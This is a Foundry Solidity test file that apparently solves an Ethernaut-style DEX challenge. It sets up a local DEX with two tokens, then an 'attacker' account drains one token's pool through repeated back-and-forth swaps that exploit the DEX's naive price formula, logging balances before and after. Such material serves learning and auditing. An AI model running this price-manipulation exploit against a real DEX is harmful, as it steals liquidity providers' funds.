// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Swap.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTest is Test {
    SwappableToken public swappabletokenA;
    SwappableToken public swappabletokenB;
    Dex public dex;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!
    function setUp() public {
        dex = new Dex();
        swappabletokenA = new SwappableToken(address(dex), "Swap", "SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableToken(address(dex), "Swap", "SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dex.setTokens(address(swappabletokenA), address(swappabletokenB));

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletokenA), 100);
        dex.addLiquidity(address(swappabletokenB), 100);

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
        vm.label(attacker, "Attacker");
    }

    function test_drainDexTokenA() public {
        console.log("\n===============BEFORE ATTACK OF DEX 1======================\n");
        uint256 initialDexBalA = swappabletokenA.balanceOf(address(dex));
        uint256 initialDexBalB = swappabletokenB.balanceOf(address(dex));
        uint256 initialAttackerBalA = swappabletokenA.balanceOf(attacker);
        uint256 initialAttackerBalB = swappabletokenB.balanceOf(attacker);

        console.log("Initial Dex Token A Bal ", initialDexBalA);
        console.log("Initial Dex Token B Bal ", initialDexBalB);
        console.log("Initial Attacker Token A Bal ", initialAttackerBalA);
        console.log("Initial Attacker Token B Bal ", initialAttackerBalB);
        console.log("\n===============STARTING ATTACK...======================\n");

        vm.startPrank(attacker);
        dex.approve(address(dex), type(uint256).max);
        dex.swap(address(swappabletokenA), address(swappabletokenB), 10);

        while (
            swappabletokenA.balanceOf(address(dex))
                > dex.getSwapPrice(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker))
        ) {
            dex.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker));
            dex.swap(address(swappabletokenA), address(swappabletokenB), swappabletokenA.balanceOf(attacker));
        }

        dex.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(address(dex)));

        uint256 AfterSwapDexBalA = swappabletokenA.balanceOf(address(dex));
        uint256 AfterSwapDexBalB = swappabletokenB.balanceOf(address(dex));

        console.log("After Swap Dex Token A Bal ", AfterSwapDexBalA);
        console.log("After Swap Dex Token B Bal ", AfterSwapDexBalB);
        console.log("After Swap Attacker Token A Bal ", swappabletokenA.balanceOf(attacker));
        console.log("After Swap Attacker Token B Bal ", swappabletokenB.balanceOf(attacker));
        console.log("\n===============END OF DEX 1 ATTACK======================");

        vm.stopPrank();

        assertEq(AfterSwapDexBalA, 0);
    }
}
